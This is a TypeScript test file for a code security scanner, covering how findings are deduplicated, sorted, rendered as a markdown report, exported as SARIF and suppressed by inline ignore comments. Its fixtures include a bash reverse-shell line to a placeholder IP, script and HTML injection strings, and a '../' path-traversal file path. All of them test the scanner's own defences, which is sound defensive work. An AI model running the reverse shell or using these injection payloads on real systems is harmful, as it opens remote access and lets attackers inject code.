import { describe, expect, it } from 'vitest';

import {
  applyInlineIgnores,
  COMMENT_MARKER,
  dedupe,
  renderReport,
  sortFindings,
  toSarif,
} from '@libs';
import { createRepo, makeFinding } from '@tests';

const code = makeFinding({ message: 'm | pipe' });
const shell = makeFinding({
  check: 'malware',
  tool: 'built-in',
  severity: 'critical',
  rule: 'reverse-shell',
  file: 'x.sh',
  line: 1,
  message: 'bad',
});

describe('findings', () => {
  it('dedupes and sorts most severe first', () => {
    expect(dedupe([code, shell, code])).toHaveLength(2);
    const low = makeFinding({ severity: 'low', file: 'b.py', line: undefined });
    expect(sortFindings([low, code, shell]).map((f) => f.severity)).toEqual([
      'critical',
      'medium',
      'low',
    ]);
  });

  it('does not treat findings whose fields contain the separator as duplicates', () => {
    const a = makeFinding({ rule: 'a|b', file: 'c' });
    const b = makeFinding({ rule: 'a', file: 'b|c' });
    expect(dedupe([a, b])).toHaveLength(2);
  });
});

describe('renderReport', () => {
  const engines = [
    { check: 'code', tool: 'semgrep', status: 'ran' },
    { check: 'secrets', tool: 'gitleaks', status: 'failed', note: 'x | y' },
  ] as const;

  it('renders languages, counts and an escaped table', () => {
    const md = renderReport({
      findings: [code, shell],
      languages: [{ name: 'Python', files: 3 }],
      ecosystems: [{ name: 'PyPI' }],
      engines,
      scope: 'changed',
    });
    expect(md.startsWith(COMMENT_MARKER)).toBe(true);
    expect(md.indexOf('Critical')).toBeLessThan(md.indexOf('Medium'));
    expect(md).toMatch(/Python \(3\)/);
    expect(md).toMatch(/m \\\| pipe/);
    expect(md).toMatch(/x \\\| y/);
    expect(md).toMatch(/files changed in this PR/);
  });

  it('neutralises hostile file names and messages', () => {
    const hostile = makeFinding({
      file: 'evil`</table><img src=x>.js',
      message: '<script>alert(1)</script>\n| injected | row |',
    });
    const md = renderReport({
      findings: [hostile],
      languages: [],
      ecosystems: [],
      engines: [],
      scope: 'all',
    });
    expect(md).not.toMatch(/<script>|<img|<\/table>/);
    expect(md).not.toMatch(/\n\| injected/);
    expect(md).toContain("evil'&lt;/table&gt;&lt;img src=x&gt;.js:2");
  });

  it('caps rows and reports a clean run', () => {
    const many = Array.from({ length: 5 }, (_, i) => makeFinding({ line: i + 1 }));
    const languages = Array.from({ length: 14 }, (_, i) => ({ name: `L${i}`, files: 1 }));
    const md = renderReport({
      findings: many,
      languages,
      ecosystems: [],
      engines: [],
      scope: 'all',
      maxRows: 2,
    });
    expect(md).toMatch(/and \*\*3 more\*\*/);
    expect(md).toMatch(/L11 \(1\), …/);
    expect(md).toMatch(/whole repository/);
    expect(
      renderReport({
        findings: [],
        languages: [],
        ecosystems: [],
        engines: [],
        scope: 'all',
      }),
    ).toMatch(
      /No problems found[\s\S]*none detected|none detected[\s\S]*No problems found/,
    );
  });
});

describe('toSarif', () => {
  it('produces SARIF 2.1.0 with one rule per id at its highest severity', () => {
    const lowFirst = makeFinding({
      check: 'malware',
      rule: 'reverse-shell',
      severity: 'low',
      file: '',
      line: undefined,
    });
    const sarif = toSarif([lowFirst, code, shell], '1.0.0');
    const run = sarif.runs[0];
    expect(sarif.version).toBe('2.1.0');
    expect(run?.results).toHaveLength(3);
    expect(run?.results[0]?.locations[0]?.physicalLocation).toEqual({
      artifactLocation: { uri: '.' },
      region: { startLine: 1 },
    });
    expect(run?.results[2]?.level).toBe('error');
    const rule = run?.tool.driver.rules.find((r) => r.id === 'malware/reverse-shell');
    expect(rule?.properties['security-severity']).toBe('9.5');
  });
});

describe('applyInlineIgnores', () => {
  it('drops findings with an ignore comment on the line or the line above', async () => {
    const root = createRepo({
      'x.sh': '# security-guard: ignore\nbash -i >& /dev/tcp/1.2.3.4/4444\nother',
    });
    const kept = await applyInlineIgnores(root, [
      { ...shell, line: 2 },
      { ...shell, line: 3 },
      { ...shell, line: undefined },
    ]);
    expect(kept.map((f) => f.line)).toEqual([3, undefined]);
  });

  it('never reads files outside the repository', async () => {
    const outside = createRepo({ 'secret.txt': 'security-guard: ignore' });
    const root = createRepo({});
    const finding = {
      ...shell,
      file: `../${outside.split('/').at(-1) ?? ''}/secret.txt`,
      line: 1,
    };
    expect(await applyInlineIgnores(root, [finding])).toEqual([finding]);
  });
});
